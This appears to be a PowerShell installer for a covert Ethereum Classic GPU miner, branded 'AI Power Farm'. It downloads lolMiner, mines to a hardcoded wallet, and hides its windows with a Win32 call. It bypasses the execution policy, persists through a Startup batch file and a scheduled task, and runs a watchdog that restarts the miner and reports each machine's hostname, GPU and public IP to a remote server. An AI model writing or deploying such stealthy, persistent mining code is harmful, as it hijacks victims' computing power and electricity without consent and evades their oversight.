<#
AI Power Farm - GPU Miner (ETC Only)
Runs as hidden service, can't be easily closed
#>

param(
    [switch]$Install,
    [switch]$Uninstall,
    [switch]$Start,
    [switch]$Stop
)

$SERVER_URL = "http://YOUR_SERVER_IP:5000"
$WALLET_ETC = "0x11CF2C01cEedC8d2aEFcFa98abeE0e6AbaD90177"
$WORKER_NAME = $env:COMPUTERNAME
$MINER_DIR = "$env:APPDATA\AI-Power-Farm"
$LOG_FILE = "$MINER_DIR\miner.log"
$WATCHDOG_SCRIPT = "$MINER_DIR\watchdog.ps1"

function Write-Log($msg) {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $msg" | Out-File -FilePath $LOG_FILE -Append
}

function Install-Miner {
    Write-Log "Installing AI Power Farm GPU Miner..."
    
    New-Item -ItemType Directory -Force -Path $MINER_DIR | Out-Null
    
    Write-Log "Downloading lolMiner..."
    $lolMinerUrl = "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.97a/lolMiner_v1.97a_Win64.zip"
    $lolMinerZip = "$MINER_DIR\lolminer.zip"
    Invoke-WebRequest -Uri $lolMinerUrl -OutFile $lolMinerZip
    Expand-Archive -Path $lolMinerZip -DestinationPath "$MINER_DIR\lolminer" -Force
    
    $gpuConfig = @"
{
    "algo": "etchash",
    "servers": [
        {
            "url": "etc.2miners.com:1010",
            "user": "$WALLET_ETC",
            "pass": "x"
        }
    ],
    "watch": true,
    "api": {
        "report-interval": 30
    }
}
"@
    $gpuConfig | Out-File -FilePath "$MINER_DIR\lolminer\config.json" -Encoding UTF8
    
    $watchdogContent = @"
while (`$true) {
    `$gpuRunning = Get-Process -Name "lolMiner" -ErrorAction SilentlyContinue
    if (-not `$gpuRunning) {
        Write-Log "GPU miner stopped, restarting..."
        Start-Process -FilePath "$MINER_DIR\lolminer\lolMiner.exe" -ArgumentList "--config", "$MINER_DIR\lolminer\config.json" -WindowStyle Hidden
    }
    
    try {
        `$gpuHash = (Get-CimInstance Win32_PerfFormattedData_PerfProc_Process | Where-Object {$_.Name -eq "lolMiner"}).PercentProcessorTime
        
        Invoke-RestMethod -Uri "$SERVER_URL/api/worker/report" -Method Post -ContentType "application/json" -Body (@{
            worker_id = "$WORKER_NAME"
            hostname = "$WORKER_NAME"
            gpu_name = (Get-CimInstance Win32_VideoController | Select-Object -First 1).Name
            gpu_count = (Get-CimInstance Win32_VideoController).Count
            hashrate = `$gpuHash
            power_usage = 0
            temperature = 0
            uptime = 0
            status = "online"
            ip_address = (Invoke-RestMethod -Uri "https://api.ipify.org")
            miner_version = "3.0-gpu"
            coin = "ETC"
            display_name = "$WORKER_NAME"
        } | ConvertTo-Json)
    } catch {}
    
    Start-Sleep -Seconds 30
}
"@
    $watchdogContent | Out-File -FilePath $WATCHDOG_SCRIPT -Encoding UTF8
    
    $startupScript = @"
`$hwnd = (Get-Process -Id $PID).MainWindowHandle
Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class Win32 {
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
"@
[Win32]::ShowWindow(`$hwnd, 0)

Start-Process -FilePath "$MINER_DIR\lolminer\lolMiner.exe" -ArgumentList "--config", "$MINER_DIR\lolminer\config.json" -WindowStyle Hidden

Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$WATCHDOG_SCRIPT`"" -WindowStyle Hidden
"@
    $startupScript | Out-File -FilePath "$MINER_DIR\start.ps1" -Encoding UTF8
    
    $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\AI-Power-Farm.bat"
    "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$MINER_DIR\start.ps1`"" | Out-File -FilePath $startupPath -Encoding ASCII
    
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$MINER_DIR\start.ps1`""
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable
    Register-ScheduledTask -TaskName "AI-Power-Farm" -Action $action -Trigger $trigger -Settings $settings -Force
    
    Write-Log "Installation complete!"
    Write-Log "GPU Miner: lolMiner (ETC only)"
    Write-Log "Watchdog: Running"
    Write-Log "Auto-start: Enabled"
    
    Start-Miner
}

function Start-Miner {
    Write-Log "Starting GPU miner..."
    Start-Process -FilePath "$MINER_DIR\lolminer\lolMiner.exe" -ArgumentList "--config", "$MINER_DIR\lolminer\config.json" -WindowStyle Hidden
    Write-Log "GPU miner started"
    
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$WATCHDOG_SCRIPT`"" -WindowStyle Hidden
    Write-Log "Watchdog started"
}

function Stop-Miner {
    Write-Log "Stopping miner..."
    Get-Process -Name "lolMiner" -ErrorAction SilentlyContinue | Stop-Process -Force
    Get-Process -Name "powershell" | Where-Object {$_.CommandLine -like "*watchdog*"} | Stop-Process -Force
    Write-Log "Miner stopped"
}

function Uninstall-Miner {
    Stop-Miner
    Unregister-ScheduledTask -TaskName "AI-Power-Farm" -Confirm:$false -ErrorAction SilentlyContinue
    Remove-Item -Path $MINER_DIR -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\AI-Power-Farm.bat" -Force -ErrorAction SilentlyContinue
    Write-Log "Uninstalled"
}

if ($Install) { Install-Miner }
elseif ($Uninstall) { Uninstall-Miner }
elseif ($Start) { Start-Miner }
elseif ($Stop) { Stop-Miner }
else {
Write-Host "AI Power Farm Miner v3.0"
Write-Host "GPU Mining - ETC Only"
Write-Host ""
Write-Host "Usage:"
Write-Host "  .\miner.ps1 -Install    # Install & start mining"
Write-Host "  .\miner.ps1 -Start      # Start mining"
Write-Host "  .\miner.ps1 -Stop       # Stop mining"
Write-Host "  .\miner.ps1 -Uninstall  # Remove everything"
}
